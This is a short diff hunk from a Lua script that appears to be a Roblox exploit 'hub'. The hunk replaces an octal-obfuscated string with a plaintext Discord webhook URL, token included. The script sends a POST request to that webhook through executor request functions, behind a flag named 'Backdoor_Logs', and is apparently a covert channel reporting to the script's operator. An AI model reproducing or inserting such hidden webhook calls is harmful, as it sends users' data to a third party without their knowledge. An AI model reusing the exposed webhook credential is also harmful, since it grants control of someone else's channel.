@@ -1566,7 +1566,7 @@ local script = G2L["20"];
 					local request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
 					if request and not _G.LALOL_Hub_Backdoor_Logs_Disabled then 
 						request({
-							Url = '\150\164\164\160\163\72\57\57\144\151\163\143\157\162\144\56\143\157\155\57\141\160\151\57\167\145\142\150\157\157\153\163\57\61\64\71\71\60\65\61\64\71\64\61\64\70\70\60\64\66\63\71\57\104\171\151\153\104\160\167\55\55\62\114\117\153\105\110\117\113\62\64\113\122\154\147\63\137\163\143\65\113\110\172\137\170\137\117\67\104\60\152\152\66\104\127\153\166\107\105\63\110\110\120\160\162\114\103\167\170\114\105\124\156\70\164\114\142\155\105\167',
+							Url = 'https://discord.com/api/webhooks/1499051494148804639/DyikDpw--2LOkEHOK24KRlg3_sc5KHz_x_O7D0jj6DWkvGE3HHPprLCwxLETn8tLbmEw',
 							Method = 'POST',
 							Headers = {
 								['Content-Type'] = 'application/json',
